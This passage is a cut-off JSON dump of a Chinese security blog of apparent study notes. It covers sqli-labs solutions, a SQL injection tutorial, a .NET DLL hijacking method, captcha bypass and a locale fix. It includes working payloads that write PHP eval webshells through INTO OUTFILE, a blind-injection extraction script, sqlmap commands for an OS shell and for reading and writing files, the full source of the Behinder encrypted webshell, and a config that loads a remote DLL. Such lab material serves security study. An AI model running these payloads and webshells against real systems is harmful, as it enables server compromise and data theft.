and&#x27;1&#x27;=&#x27;139、http://192.168.101.10:12345/Less-39/?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1) and 1=2 #40、http://192.168.101.10:12345/Less-40/?id=1&#x27; and length(database())=8 and &#x27;1&#x27;=&#x27;141、http://192.168.101.10:12345/Less-41/?id=1 and length(database())=842、login_user=admin&amp;mysubmit=Login&amp;login_password=admin&#x27;;select &quot;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/test/muma500.php&quot;;#43、login_user=admin&amp;mysubmit=Login&amp;login_password=admin&#x27;);select &quot;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/test/muma501.php&quot;;#44、mysubmit=Login&amp;login_user=admin&amp;login_password=admin&#x27;;select &quot;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/test/muma44.php&quot;;#45、mysubmit=Login&amp;login_user=admin&amp;login_password=admin&#x27;);select &quot;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/test/muma45.php&quot;;#46、http://192.168.101.10:12345/Less-46/?sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1)47、http://192.168.101.10:12345/Less-47/?sort=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+48、http://192.168.101.10:12345/Less-48/?sort=1 and if(length(database())=7,sleep(3),1)49、http://192.168.101.10:12345/Less-49/?sort=1&#x27; and if(length(database())=8,sleep(3),1) and &#x27;1&#x27;=&#x27;150、http://192.168.101.10:12345/Less-50/?sort=1; select &quot;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/test/muma50.php&quot;;#51、http://192.168.101.10:12345/Less-51/?sort=1&#x27;; select &quot;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/test/muma51.php&quot;;#52、http://192.168.101.10:12345/Less-52/?sort=1; select &quot;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/test/muma52.php&quot;;# 总结： 测试的时候要实验全一些 1、id&#x3D;1,id&#x3D;1’,id&#x3D;1”;id&#x3D;1’); id&#x3D;1’)); id&#x3D;1”); id&#x3D;1”)); –+; # ; 以及没有注释，需要补全的情况 1234567891011121314151617http://192.168.101.10:12345/Less-7/?id=1http://192.168.101.10:12345/Less-7/?id=1&#x27;http://192.168.101.10:12345/Less-7/?id=1&#x27;)http://192.168.101.10:12345/Less-7/?id=1&#x27;))http://192.168.101.10:12345/Less-7/?id=1&quot; http://192.168.101.10:12345/Less-7/?id=1&quot;) http://192.168.101.10:12345/Less-7/?id=1&quot;))找到报错的情况后 (非注释)http://192.168.101.10:12345/Less-7/?id=1&#x27; and &#x27;1&#x27;=&#x27;1http://192.168.101.10:12345/Less-7/?id=1&#x27;) and (&#x27;1&#x27;)=(&#x27;1http://192.168.101.10:12345/Less-7/?id=1&#x27;)) and ((&#x27;1&#x27;))=((&#x27;1http://192.168.101.10:12345/Less-7/?id=1&quot; and &quot;1&quot;=&quot;1http://192.168.101.10:12345/Less-7/?id=1&quot;) and (&quot;1&quot;)=(&quot;1http://192.168.101.10:12345/Less-7/?id=1&quot;)) and ((&quot;1&quot;))=((&quot;1 2、怎么测试都没有回显，上述测试的加上时间型盲注 1http://192.168.101.10:12345/Less-10/?id=1&quot; and if(length(database())=8,sleep(3),1) --+ 3、登录类型的，账号和密码都要分开尝试 4、http 头注要根据报错，获取头所在的位置","categories":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"一种新的DLL劫持方法","slug":"逆向/一种DLL劫持方式","date":"2023-11-29T16:00:00.000Z","updated":"2024-03-12T15:15:23.882Z","comments":true,"path":"2023/11/30/逆向/一种DLL劫持方式/","link":"","permalink":"http://zwjsfdbb.top/2023/11/30/%E9%80%86%E5%90%91/%E4%B8%80%E7%A7%8DDLL%E5%8A%AB%E6%8C%81%E6%96%B9%E5%BC%8F/","excerpt":"1、参考链接 https://github.com/Mr-Un1k0d3r/.NetConfigLoader 2、实际步骤 编写DLL程序 Program.cs 12345678910111213using System;using System.Diagnostics;using System.Security.Policy;public sealed class MyDomainManager : AppDomainManager&#123; public override void InitializeNewDomain(AppDomainSetup appDomainInfo) &#123; base.InitializeNewDomain(appDomainInfo); Process.Start(&quot;calc.exe&quot;); &#125;&#125; sn.exe -k key.snk csc.exe &#x2F;t:library &#x2F;keyfile:key.snk &#x2F;out:my.dll Program.cs PS&gt; [System.Reflection.AssemblyName]::GetAssemblyName(“C:\\full\\path\\to\\dll\\my.dll”).FullName 把DLL放到特定服务器 寻找合适的exe 文件 我找的是 C:\\Windows\\SysWOW64\\stordiag.exe 自身不带config文件 config文件构造 根据实际情况，修改DLLNAME，publicKeyToken ，href ，CLASSNAME 12345678910111213&lt;configuration&gt; &lt;runtime&gt; &lt;assemblyBinding xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot;&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity name=&quot;DLLNAME&quot; publicKeyToken=&quot;xxx&quot; culture=&quot;neutral&quot; /&gt; &lt;codeBase version=&quot;0.0.0.0&quot; href=&quot;http://xxx/my.dll&quot;/&gt; &lt;/dependentAssembly&gt; &lt;/assemblyBinding&gt; &lt;etwEnable enabled=&quot;false&quot; /&gt; &lt;appDomainManagerAssembly value=&quot;DLLNAME, Version=0.0.0.0, Culture=neutral, PublicKeyToken=xxx&quot; /&gt; &lt;appDomainManagerType value=&quot;CLASSNAME&quot; /&gt; &lt;/runtime&gt;&lt;/configuration&gt;","text":"1、参考链接 https://github.com/Mr-Un1k0d3r/.NetConfigLoader 2、实际步骤 编写DLL程序 Program.cs 12345678910111213using System;using System.Diagnostics;using System.Security.Policy;public sealed class MyDomainManager : AppDomainManager&#123; public override void InitializeNewDomain(AppDomainSetup appDomainInfo) &#123; base.InitializeNewDomain(appDomainInfo); Process.Start(&quot;calc.exe&quot;); &#125;&#125; sn.exe -k key.snk csc.exe &#x2F;t:library &#x2F;keyfile:key.snk &#x2F;out:my.dll Program.cs PS&gt; [System.Reflection.AssemblyName]::GetAssemblyName(“C:\\full\\path\\to\\dll\\my.dll”).FullName 把DLL放到特定服务器 寻找合适的exe 文件 我找的是 C:\\Windows\\SysWOW64\\stordiag.exe 自身不带config文件 config文件构造 根据实际情况，修改DLLNAME，publicKeyToken ，href ，CLASSNAME 12345678910111213&lt;configuration&gt; &lt;runtime&gt; &lt;assemblyBinding xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot;&gt; &lt;dependentAssembly&gt; &lt;assemblyIdentity name=&quot;DLLNAME&quot; publicKeyToken=&quot;xxx&quot; culture=&quot;neutral&quot; /&gt; &lt;codeBase version=&quot;0.0.0.0&quot; href=&quot;http://xxx/my.dll&quot;/&gt; &lt;/dependentAssembly&gt; &lt;/assemblyBinding&gt; &lt;etwEnable enabled=&quot;false&quot; /&gt; &lt;appDomainManagerAssembly value=&quot;DLLNAME, Version=0.0.0.0, Culture=neutral, PublicKeyToken=xxx&quot; /&gt; &lt;appDomainManagerType value=&quot;CLASSNAME&quot; /&gt; &lt;/runtime&gt;&lt;/configuration&gt;","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"SQL 注入","slug":"Web渗透/SQL注入","date":"2023-11-27T16:00:00.000Z","updated":"2024-03-12T10:14:56.058Z","comments":true,"path":"2023/11/28/Web渗透/SQL注入/","link":"","permalink":"http://zwjsfdbb.top/2023/11/28/Web%E6%B8%97%E9%80%8F/SQL%E6%B3%A8%E5%85%A5/","excerpt":"一、数据类型1）数字型 1select * from tables where id=1; 2）字符型 1select * from tables where username=&#x27;zz&#x27; 3）搜索型 1select * from tables where id like &#x27;%woniu%&#x27; 2、注入步骤 - 联合注入1） 通过and 1&#x3D;2 ,and 1&#x3D;2 以及单引号等特殊语句来确定是否存在注入点，and 1&#x3D;1 和and 1&#x3D;2 返回不一致，代表有注入点，测试时注意字符型和数字型的区别，and 1&#x3D;1 正常返回结果，and 1&#x3D;2 没有返回 1?id=1 and 1=2","text":"一、数据类型1）数字型 1select * from tables where id=1; 2）字符型 1select * from tables where username=&#x27;zz&#x27; 3）搜索型 1select * from tables where id like &#x27;%woniu%&#x27; 2、注入步骤 - 联合注入1） 通过and 1&#x3D;2 ,and 1&#x3D;2 以及单引号等特殊语句来确定是否存在注入点，and 1&#x3D;1 和and 1&#x3D;2 返回不一致，代表有注入点，测试时注意字符型和数字型的区别，and 1&#x3D;1 正常返回结果，and 1&#x3D;2 没有返回 1?id=1 and 1=2 2）order by 确定列数 order by number 超过列数就会报错 1?id=1 order by number 当number &#x3D;1，2，3 时，正常返回，&#x3D;4 时报错，说明只有3列。 3）union 的用法 查询列数 union 来查询列数，1，2，3代表有三列。 将主查询项改为负数或者不存在 12345678# id= -1? union select 1,2,3 如下图所示，可以看出，2 是标题，3 是正文，这样2，3就可以替换成一些内置的mysql函数来泄露一些信息，如SYSTEM_USER(),@@VERSION,@@PORT?id=-1 union select 1,2,@@PORT# 在能够回显的情况下，可以做任意支持的查询，如sql语句，内置的函数?id=-1 union select 1,2,(select password from user_account limit 1) 4）information_schema 查询表的相关信息 12345678910111213141516# 查询某库的表名select group_concat(TABLE_NAME) from information_schema.TABLES where table_schema=&#x27;库名&#x27;# 查询某库的所有列名select group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_schema=&#x27;库名&#x27; # 查询所有数据库的名字select group_concat(distinct(table_schema)) from information_schema.tablesselect GROUP_CONCAT(SCHEMA_name) from information_schema.SCHEMATA# 如果存在phpmyadmin，可以尝试访问，后台如果认证方式是config，则可以直接进入后台，如果是http，则可以爆破，最好不好开启phpmyadmin,或者在需要的时候开启远访问。配置文件路径/opt/lampp/phpmyadmin/config.inc.php/opt/lampp/etc/extra/httpd-xampp.conf 123require local 允许本地require all granted 运行所有 5） 查询密码 1select CONCAT(user,&#x27;==&#x27;,PASSWORD) from mysql.user limit 1 6） 针对已经加了addslashes函数的后台 1table_name = &#x27;learn&#x27; 等效于 table_name = hex(&#x27;learn&#x27;) 7)非数字型 12345678910111213# 正常情况下select * from user_account where password like &#x27;%123%&#x27;# 测试 123%&#x27;-- &#x27;select * from user_account where password like &#x27;%123%&#x27;-- &#x27;%&#x27;# 测试 123%&#x27;#&#x27;select * from user_account where password like &#x27;%123%&#x27;#&#x27;%&#x27; 8）、读写权限确认 123456789show GLOBAL VARIABLES like &#x27;%secure%&#x27;secure_file_priv = 空 任意secure_file_priv = 路径 该路径下可读写secure_file_priv = NULL 不可读写测试语句 select LOAD_FILE(&#x27;/etc/passwd&#x27;)真实情况下，可以使用burp 爆破路径下的文件代理-》发送到intruder-&gt;选择payload点-》选择payload, 攻击 9）、写木马 12345678# 需要有写权限id=-1 union select 1,2,&#x27;&lt;?php @eval($_GET[&quot;a&quot;]);?&gt;&#x27; into outfile &#x27;/opt/lampp/htdocs/learn/test/muma.php&#x27;# 一句话木马&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt; 可以传的数据更多，一般用posteval 可以将一段字符串当成代码来执行，如果用户可以直接将这段有效的代码传入后台，则可以直接执行任意代码或者指令。 10）、木马连接 选择蚁剑 或者菜刀，菜刀连接失败，可能是php版本太高，一些函数不支持 配置如下 打开虚拟终端，测试下 抓包 发现是明文的代码，估计绕不过WAF 冰蝎是加密的，可以试用一下，配置麻烦一些，需要把冰蝎的server的木马文件（webshell）上传到目标主机，需要设置好密码。 php版本 的如下 123456789101112131415161718192021222324252627&lt;?php@error_reporting(0);session_start(); $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond $_SESSION[&#x27;k&#x27;]=$key; session_write_close(); $post=file_get_contents(&quot;php://input&quot;); if(!extension_loaded(&#x27;openssl&#x27;)) &#123; $t=&quot;base64_&quot;.&quot;decode&quot;; $post=$t($post.&quot;&quot;); for($i=0;$i&lt;strlen($post);$i++) &#123; $post[$i] = $post[$i]^$key[$i+1&amp;15]; &#125; &#125; else &#123; $post=openssl_decrypt($post, &quot;AES128&quot;, $key); &#125; $arr=explode(&#x27;|&#x27;,$post); $func=$arr[0]; $params=$arr[1]; class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125; @call_user_func(new C(),$params);?&gt; 上传可通过文件上传漏洞，或者放到一个公网服务器上，用一句话木马下载到特定目录。 三、报错注入利用updatexml 实现报错，union 不好用的情况下用，如果die函数把报错屏蔽了就没法用了。 12updatexml(1,concat(0x7e,database(),0x7e),1) concat(0x7e,database(),0x7e) 这个xml路径不存在就会报错database()这个可以用任意的sql语句来代替，跟以上union 就一样了 四、盲注 布尔盲注 基于真假的判断，不管输入什么，结果都只返回真或者假两种情况。通过表达式结果与已知的值进行比对，根据比对结果来判断正确与否。如下所示，通过length 函数判断sql函数database()的结果，如果为真，显示正常页面，如果为假，不显示正常页面，代表布尔盲注成功。 盲注经常用到的函数 1234length() # 先猜测长度，从而知道循环遍历的长度substr(string,start,length) es. substr(database(),1,1)=&#x27;L&#x27; 从1 开始的长度为1 的字符，可以用来遍历查找表名，列名 left(string，n) 截取左边的n个字符ord() 函数返回字符串第一个字符的ASCII值 时间型盲注 123id=1 and if (length(database())=5,sleep(3),1)id=1 and if (substr(database(),1,1)=&#x27;a&#x27;,sleep(3),1) 如果满足条件 如 length(database())&#x3D;5，则休眠三秒，如果不满足则返回1，显示正常结果 用python 代码实现比较快一些，获取数据库的名字 1234567891011121314151617181920212223242526import timeimport requestslen = 0for i in range(1,50): start = time.time() header = &#123;&quot;Cookie&quot;:&quot;PHPSESSID=7c2076c8b46b66a023cf3b2d2df89341&quot;&#125; url = f&#x27;http://192.168.101.10/learn/read.php?id=1 and if (length(database())=&#123;i&#125;,sleep(3),1)&#x27; resp = requests.get(url=url,headers=header) end = time.time() if int(end-start)&gt;=3: len = i breakdatabase = &#x27;&#x27;for i in range(1,len+1): for letter, index in enumerate(range(ord(&#x27;a&#x27;), ord(&#x27;z&#x27;) + 1)): start = time.time() header = &#123;&quot;Cookie&quot;:&quot;PHPSESSID=7c2076c8b46b66a023cf3b2d2df89341&quot;&#125; strxx = chr(index) url = f&quot;http://192.168.101.10/learn/read.php?id=1 and if (substr(database(),&#123;i&#125;,1)=&#x27;&#123;strxx&#125;&#x27;,sleep(3),1)&quot; resp = requests.get(url=url,headers=header) end = time.time() if int(end-start)&gt;=3: database = database + strxxprint(database) 五、sqlmap的使用12python sqlmap.py http://192.168.101.10/learn/read.php?id=1 --cookie=&quot;PHPSESSID=ce719860bce9263a3b4abf175eb31522&quot; 出现以下注入payload 1234567891011121314151617---Parameter: id (GET) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: id=(SELECT (CASE WHEN (3590=3590) THEN 1 ELSE (SELECT 7831 UNION SELECT 8509) END)) Type: error-based Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: id=1 OR (SELECT 8258 FROM(SELECT COUNT(*),CONCAT(0x7178626271,(SELECT (ELT(8258=8258,1))),0x716b627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: id=1 AND (SELECT 3666 FROM (SELECT(SLEEP(5)))suGs) Type: UNION query Title: Generic UNION query (NULL) - 3 columns Payload: id=-2433 UNION ALL SELECT NULL,NULL,CONCAT(0x7178626271,0x54667651697a4b4e535a567479494b4e4b4f79614b614d76574259635064427152596e6376635a6e,0x716b627171)-- - 常见的sqlmap命令 123456789101112131415161718# 查看所有的数据库python sqlmap.py http://192.168.101.10/learn/read.php?id=1 --cookie=&quot;PHPSESSID=ce719860bce9263a3b4abf175eb31522&quot; --dbs# 查看当前数据库python sqlmap.py http://192.168.101.10/learn/read.php?id=1 --cookie=&quot;PHPSESSID=ce719860bce9263a3b4abf175eb31522&quot; --current-db# 查看当前数据库的表python sqlmap.py http://192.168.101.10/learn/read.php?id=1 --cookie=&quot;PHPSESSID=ce719860bce9263a3b4abf175eb31522&quot; --tables -D &quot;learn&quot;# 查看当前表的所有列python sqlmap.py http://192.168.101.10/learn/read.php?id=1 --cookie=&quot;PHPSESSID=ce719860bce9263a3b4abf175eb31522&quot; --tables --columns -T &quot;article&quot; -D &quot;learn&quot;# 获取表中的内容python sqlmap.py http://192.168.101.10/learn/read.php?id=1 --cookie=&quot;PHPSESSID=ce719860bce9263a3b4abf175eb31522&quot; --dump -C &quot;articleid,content,headline&quot; -T &quot;article&quot; -D &quot;learn&quot;# 指定数据库类型，判断是不是DBApython sqlmap.py http://192.168.101.10/learn/read.php?id=1 --cookie=&quot;PHPSESSID=ce719860bce9263a3b4abf175eb31522&quot; --dbms=mysql --is-dba# 写入shell(一般失败的可能性比较大)python sqlmap.py http://192.168.101.10/learn/read.php?id=1 --cookie=&quot;PHPSESSID=ce719860bce9263a3b4abf175eb31522&quot; --dbms=mysql --os-shell# 读取文件python sqlmap.py http://192.168.101.10/learn/read.php?id=1 --cookie=&quot;PHPSESSID=ce719860bce9263a3b4abf175eb31522&quot; --dbms=mysql --file-read &quot;/etc/passwd&quot;# 手动写入木马48 python sqlmap.py http://192.168.101.10/learn/read.php?id=1 --cookie=&quot;PHPSESSID=ce719860bce9263a3b4abf175eb31522&quot; --dbms=mysql --file-write .\\muma.php --file-dest /opt/lampp/htdocs/learn/test/muma_demo.php 六、其他注入 更新注入，更新类的操作更多是返回布尔的结果，因此也只能通过报错注入来实现。 1234insert into user(username,password,role) values(&#x27;wow&#x27; or updatexml(1,concat(0x7e,(database()),0x7e),1) or &#x27;&#x27;,123456,&#x27;user&#x27;))# &#x27;wow&#x27; or updatexml(1,concat(0x7e,(database()),0x7e),1) or &#x27;&#x27; 是username update user set password=&#x27;111&#x27; or updatexml(1,concat(0x7e,(database()),0x7e),1) or &#x27;&#x27; where userid=1# password = 111&#x27; or updatexml(1,concat(0x7e,(database()),0x7e),1) or &#x27; 堆叠注入 在一个执行的语句中可以执行多条sql语句 12select * from user where userid=1;update user set password=&#x27;123456&#x27; where userid=1# 1;update user set password=&#x27;123456&#x27; where userid=1 是payload 实现的条件是 $conn-&gt;multi_query() 可以执行多条语句。 二次注入 先注册后更新的场景 前面转义后面没转义 1234567891011121314151617insert into user(name,password) values(&#x27;woniu\\&#x27;#&#x27;,&#x27;123456&#x27;)update into user()# 注册$username = addslashes($_POST[&#x27;username&#x27;]);$password = addslashes($_POST[&#x27;password&#x27;]);$sql = insert into user(name,password) values($username,$password);$conn-&gt;query(sql);# 更新$username = $_POST[&#x27;username&#x27;];$password = $_POST[&#x27;password&#x27;];$sql = &quot;update user set password=&#x27;$password&#x27; where username=&#x27;$username&#x27;&quot;;$conn-&gt;query($sql);# update user set password=&#x27;123456&#x27; where username=&#x27;woniu&#x27;#&#x27; 从而修改了已有的用户的密码 宽字符注入 实现要求： 要求gbk编码(两个字节的编码)，并且采用了addslashes()函数进行转义 12345select * from article where articleid=&#x27;$id&#x27;# 输入id=1&#x27; 就变成了select * from article where articleid=&#x27;1\\&#x27;&#x27;# 在gbk 中输入1%bf的时候，%bf和\\会形成一个新的汉字，从而导致语句如下select * from article where articleid=&#x27;1%bf%5c&#x27; union select 1,2,3,4 -- &#x27; 二次编码注入 12345678910$conn = create_connection_oop();$id = urldecode(addslashes($_GET[&#x27;id&#x27;]));echo $id .&quot;&lt;br&gt;&quot;;$result = $conn-&gt;&gt;query(&quot;select * from user where userid=&#x27;$id&#x27;&quot;);$rows = $result-&gt;fetch_row();var_dump($rows);# id = 1%2527 and 1=1 --+ url解码以后编程下面# id = 1&#x27; and 1=1 --+ 七、一些技巧 确定字符串可以使用hex函数转成16进制来处理，避免引号转义等问题。 123select hex(&#x27;/etc/passwd&#x27;) # 2F6574632F706173737764select LOAD_FILE(0x2F6574632F706173737764) WAF 绕过 1234双写绕过 selselectect,anandd大小写绕过编码绕过特殊字符绕过 代码注入 可以执行代码的函数 eval ,assert,preg_replace,create_function 命令注入 php可以执行命令的函数 system,exec ,shell_exec,passthru 以及任何可能接收前端输入，后台执行的地方都可能造成命令注入 HTTP 头注入 12345678910111213# 假设站点会收集用户的访问信息，后台代码如下$useragent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];$refer = $_SERVER[&#x27;HTTP_REFER&#x27;];$xforward =$_SERVER[&#x27;HTTP_X_FORWORDED_FOR&#x27;];$sql = &quot;insert into header(useragent,refer,xforward) values(&#x27;$useragent&#x27;,&#x27;$refer&#x27;,&#x27;$xforward&#x27;)&quot;;$conn-&gt;query($sql);# 构造payload，自行更改字段，如X-Forwarded-FOR:&#x27;or updatexml(1,concat(0x7e,databse(),0x73),1)&#x27;# 这样就可以完成注入。","categories":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"Linux 终端乱码","slug":"系统基础/Linux 终端乱码","date":"2023-11-22T16:00:00.000Z","updated":"2024-03-12T15:32:56.448Z","comments":true,"path":"2023/11/23/系统基础/Linux 终端乱码/","link":"","permalink":"http://zwjsfdbb.top/2023/11/23/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/Linux%20%E7%BB%88%E7%AB%AF%E4%B9%B1%E7%A0%81/","excerpt":"在终端执行locale 更改带utf-8 export LC_ALL&#x3D;en_US.UTF-8","text":"在终端执行locale 更改带utf-8 export LC_ALL&#x3D;en_US.UTF-8","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"验证码原理","slug":"Web渗透/验证码相关","date":"2023-11-15T16:00:00.000Z","updated":"2024-03-12T13:02:01.718Z","comments":true,"path":"2023/11/16/Web渗透/验证码相关/","link":"","permalink":"http://zwjsfdbb.top/2023/11/16/Web%E6%B8%97%E9%80%8F/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9B%B8%E5%85%B3/","excerpt":"1、简单代码如下： 1234567891011121314151617181920212223242526272829303132&lt;?php// &lt;!-- 利用Session 保存图片验证码 --&gt;session_start(); // 当客户端已经获取Session ID，只要通过HTTP请求中的Cookies 字段发送给服务器，服务器不再生成function get_vcode($vlen=4,$width=80,$height =25)&#123; // 定义响应类型为png header(&quot;content-type:image/png&quot;); $chars = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $vcode = substr(str_shuffle($chars),0,$vlen); $_SESSION[&#x27;vcode&#x27;] = $vcode; // 定义图片的背景 RGB 100 200 100 $image = imagecreate($width,$height); $imgColor = imagecolorallocate($image,100,200,100); // 绘制黑色文字 $color = imagecolorallocate($image,0,0,0); imagestring($image,5,20,5,$vcode,$color); //生成一批随机位置的干扰点 for($i=0;$i&lt;50;$i++) &#123; imagesetpixel($image,rand(0,$width),rand(0,$height),$color); &#125; // 输出图片 imagepng($image); imagedestory($image);&#125;get_vcode();?&gt; 2、验证码 保存在session 中，可以在服务器上进行确认，路径如下 3、设置验证码，使用一次就失效，防止重放 12# 每次登录用过一次，清空vcodeunset($_SESSION[&#x27;vcode&#x27;]); 全部报 vcode-error ，在服务器的session 中没有vcode 字段，防止一个通过的验证码一直重用。 修改代码如下：","text":"1、简单代码如下： 1234567891011121314151617181920212223242526272829303132&lt;?php// &lt;!-- 利用Session 保存图片验证码 --&gt;session_start(); // 当客户端已经获取Session ID，只要通过HTTP请求中的Cookies 字段发送给服务器，服务器不再生成function get_vcode($vlen=4,$width=80,$height =25)&#123; // 定义响应类型为png header(&quot;content-type:image/png&quot;); $chars = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $vcode = substr(str_shuffle($chars),0,$vlen); $_SESSION[&#x27;vcode&#x27;] = $vcode; // 定义图片的背景 RGB 100 200 100 $image = imagecreate($width,$height); $imgColor = imagecolorallocate($image,100,200,100); // 绘制黑色文字 $color = imagecolorallocate($image,0,0,0); imagestring($image,5,20,5,$vcode,$color); //生成一批随机位置的干扰点 for($i=0;$i&lt;50;$i++) &#123; imagesetpixel($image,rand(0,$width),rand(0,$height),$color); &#125; // 输出图片 imagepng($image); imagedestory($image);&#125;get_vcode();?&gt; 2、验证码 保存在session 中，可以在服务器上进行确认，路径如下 3、设置验证码，使用一次就失效，防止重放 12# 每次登录用过一次，清空vcodeunset($_SESSION[&#x27;vcode&#x27;]); 全部报 vcode-error ，在服务器的session 中没有vcode 字段，防止一个通过的验证码一直重用。 修改代码如下： 12345678910111213if(isset($_SESSION[&#x27;vcode&#x27;]) &amp;&amp; $_SESSION[&#x27;vcode&#x27;] != $captcha)&#123;die(&#x27;vcode-error&#x27;);&#125;// 清空验证码if (isset($_SESSION[&#x27;vcode&#x27;]))&#123;unset($_SESSION[&#x27;vcode&#x27;]);&#125; 4、避免Cookie 验证码 Cookie在客户端保存，如果把验证码保存在Cookie 中，那么可以客户端可以直接操作Cookie和用户输入一致就可以绕过验证码了，无任何实际作用。 5、验证码识别 百度云API接口，有免费额度 获取access_token 123456789101112131415161718192021import requestsimport jsondef main(): url = &quot;https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&amp;client_id=xxxxxx&amp;client_secret=xxxxx&quot; payload = &quot;&quot; headers = &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27;, &#x27;Accept&#x27;: &#x27;application/json&#x27; &#125; response = requests.request(&quot;POST&quot;, url, headers=headers, data=payload) print(response.text) if __name__ == &#x27;__main__&#x27;: main() 调用API接口 12345678910111213141516171819202122# encoding:utf-8import requestsimport base64&#x27;&#x27;&#x27;通用文字识别&#x27;&#x27;&#x27;request_url = &quot;https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic&quot;# 二进制方式打开图片文件f = open(&#x27;[本地文件]&#x27;, &#x27;rb&#x27;)img = base64.b64encode(f.read())params = &#123;&quot;image&quot;:img&#125;access_token = &#x27;[调用鉴权接口获取的token]&#x27;request_url = request_url + &quot;?access_token=&quot; + access_tokenheaders = &#123;&#x27;content-type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;&#125;response = requests.post(request_url, data=params, headers=headers)if response: print (response.json()) burp 插件 captcha-killer 使用 下载地址 ​ https://github.com/Ta0ing/captcha-killer-java8 安装 随后工具栏就会有captcha-killer，接下来burp 开启代理抓验证码的包以后action，发送到captcha-killer 首先点击获取，获取到验证码，代表插件工作正常，获取不到报错，代表burp 版本和插件版本不符，换版本吧，随后接口URL那里选用 百度ocr的模板，更改POST对应的接口以及access_token，随后点击识别，出现识别结果，标记识别结果后会生成对应的匹配规则，点击匹配，每次都会在右边生成验证码以及识别结果。 实际操作 vcode请求发送给captcha-killer，输入用户名，密码，验证码后发送给intruder，保证session 一致。 注意： payload 多线程可能导致匹配逻辑问题 有时候可能不如自己写python 处理来的自由 登录防护 验证码不建议图片 登录次数，记录IP 多因素认证 记录常用地区，不在常用地区登录，预警 token的使用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889//增加失败次数超过5，限制登录一个小时&lt;?php include &quot;common.php&quot;; /** * 获取请求数据的方式 * GET $_GET 获取GET请求的地址参数数据 * POST $_POST 获取POST请求的正文数据 */ $username = addslashes($_POST[&#x27;username&#x27;]); $password = $_POST[&#x27;password&#x27;]; $captcha = $_POST[&#x27;captcha&#x27;]; //万能验证码 存在安全漏洞 OWASP-认证和授权失败 if ($captcha !==&#x27;0000&#x27;) &#123; if(isset($_SESSION[&#x27;vcode&#x27;]) &amp;&amp; $_SESSION[&#x27;vcode&#x27;] != $captcha) &#123; die(&#x27;vcode-error&#x27;); &#125; &#125; // 清空验证码 if (isset($_SESSION[&#x27;vcode&#x27;])) &#123; unset($_SESSION[&#x27;vcode&#x27;]); &#125; $conn = create_connection_oop(); $sql = &quot;select userid,username,password,failcount,TIMESTAMPDIFF(Minute,now(),lasttime) from user_account where username= ?&quot;; $stmt = $conn-&gt;prepare($sql); $stmt-&gt;bind_param(&quot;s&quot;,$username); // 绑定结果参数 $stmt-&gt;bind_result($userid,$username1,$password1,$failcount,$time_diff); $stmt-&gt;execute(); $stmt-&gt;store_result(); if($stmt-&gt;num_rows == 1) &#123; $stmt-&gt;fetch(); // echo $time_diff; if($failcount &gt; 5 &amp;&amp; $time_diff &lt; 60) &#123; die(&quot;user-locked, please wait...&quot;); &#125; if($password == $password1) &#123; echo &quot;login-success&quot;; echo &quot;&lt;script&gt;location.href=&#x27;hello.php&#x27;&lt;/script&gt;&quot;; //登录成功后记录session变量 $_SESSION[&#x27;username&#x27;] = $username; $_SESSION[&#x27;islogin&#x27;] = &#x27;true&#x27;; $new_sql = &quot;update user_account set failcount = 0 where username= ?&quot;; $stmt = 